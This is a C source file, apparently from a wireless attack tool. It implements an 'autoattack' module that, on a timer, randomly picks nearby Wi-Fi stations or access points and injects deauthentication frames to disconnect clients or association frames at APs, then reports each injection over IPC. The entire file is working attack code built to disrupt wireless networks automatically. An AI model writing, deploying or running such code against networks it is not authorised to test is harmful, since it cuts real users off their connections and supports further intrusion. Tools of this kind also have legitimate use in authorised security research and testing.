/* SPDX-License-Identifier: GPL-3.0-or-later */
#include "autoattack.h"
#include "log.h"
#include "proto.h"

#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <sys/timerfd.h>
#include <unistd.h>

struct autoattack {
	struct table  *table;
	struct inject *inject;
	struct ipc    *ipc;
	int            timerfd;
	int            running;
};

struct autoattack *autoattack_create(struct table *t, struct inject *inj, struct ipc *ipc)
{
	struct autoattack *aa = calloc(1, sizeof *aa);
	if (!aa) return NULL;

	aa->table  = t;
	aa->inject = inj;
	aa->ipc    = ipc;
	aa->timerfd = timerfd_create(CLOCK_MONOTONIC, TFD_NONBLOCK | TFD_CLOEXEC);
	if (aa->timerfd < 0) {
		log_err("timerfd_create(autoattack): %s", strerror(errno));
		free(aa);
		return NULL;
	}
	return aa;
}

void autoattack_destroy(struct autoattack *aa)
{
	if (!aa) return;
	if (aa->timerfd >= 0) {
		if (aa->ipc) ipc_remove_fd(aa->ipc, aa->timerfd);
		close(aa->timerfd);
	}
	free(aa);
}

int autoattack_fd(const struct autoattack *aa) { return aa->timerfd; }

static int emit_inject_event(struct autoattack *aa, const char *tag, const uint8_t bssid[6], const uint8_t *sta)
{
	char  buf[512];
	size_t pos = 0;
	int    first = 1;
	ssize_t r;
	char   mac_ap[18], mac_sta[18];
	dot11_mac_str(bssid, mac_ap);

	if ((r = proto_event_begin(buf, sizeof buf, pos, tag)) < 0) return -1;
	pos = (size_t)r;
	if ((r = proto_field_str(buf, sizeof buf, pos, &first, "bssid", mac_ap)) < 0) return -1;
	pos = (size_t)r;
	if (sta) {
		dot11_mac_str(sta, mac_sta);
		if ((r = proto_field_str(buf, sizeof buf, pos, &first, "sta", mac_sta)) < 0) return -1;
		pos = (size_t)r;
	}
	if ((r = proto_event_end(buf, sizeof buf, pos)) < 0) return -1;
	pos = (size_t)r;
	return ipc_broadcast(aa->ipc, buf, pos);
}

void autoattack_on_timer(void *user)
{
	struct autoattack *aa = user;
	uint64_t expirations;
	ssize_t  n = read(aa->timerfd, &expirations, sizeof expirations);
	if (n < 0) return;
	if (!aa->running) return;

	struct ap_record aps[TABLE_MAX_APS];
	int num_aps = table_snapshot_aps(aa->table, aps, TABLE_MAX_APS);
	if (num_aps == 0) return;

	/* 50% chance to Deauth a STA, 50% chance to Assoc an AP */
	int do_deauth = (rand() % 2 == 0);

	if (do_deauth) {
		struct sta_record stas[TABLE_MAX_STAS];
		int num_stas = table_snapshot_stas(aa->table, stas, TABLE_MAX_STAS);
		if (num_stas > 0) {
			/* Pick a random STA that has an AP */
			int start_idx = rand() % num_stas;
			for (int i = 0; i < num_stas; i++) {
				int idx = (start_idx + i) % num_stas;
				if (stas[idx].have_ap) {
					inject_deauth(aa->inject, stas[idx].ap_bssid, stas[idx].mac, 5, 7);
					emit_inject_event(aa, "inject.deauth", stas[idx].ap_bssid, stas[idx].mac);
					return;
				}
			}
		}
	}

	/* Fallback or if Assoc chosen */
	int idx = rand() % num_aps;
	inject_assoc(aa->inject, aps[idx].bssid, aps[idx].ssid, aps[idx].ssid_len);
	emit_inject_event(aa, "inject.assoc", aps[idx].bssid, NULL);
}

int autoattack_start(struct autoattack *aa, int interval_ms)
{
	if (!aa || interval_ms <= 0) return -1;
	struct itimerspec its = {0};
	its.it_value.tv_sec     = interval_ms / 1000;
	its.it_value.tv_nsec    = (long)(interval_ms % 1000) * 1000000L;
	its.it_interval         = its.it_value;
	if (timerfd_settime(aa->timerfd, 0, &its, NULL) < 0) {
		log_err("timerfd_settime(autoattack): %s", strerror(errno));
		return -1;
	}
	aa->running = 1;
	log_info("autoattack: started, interval %d ms", interval_ms);
	return 0;
}

int autoattack_stop(struct autoattack *aa)
{
	if (!aa) return -1;
	if (!aa->running) return 0;
	struct itimerspec its = {0};
	if (timerfd_settime(aa->timerfd, 0, &its, NULL) < 0) {
		log_err("timerfd_settime(autoattack disarm): %s", strerror(errno));
		return -1;
	}
	aa->running = 0;
	log_info("autoattack: stopped");
	return 0;
}
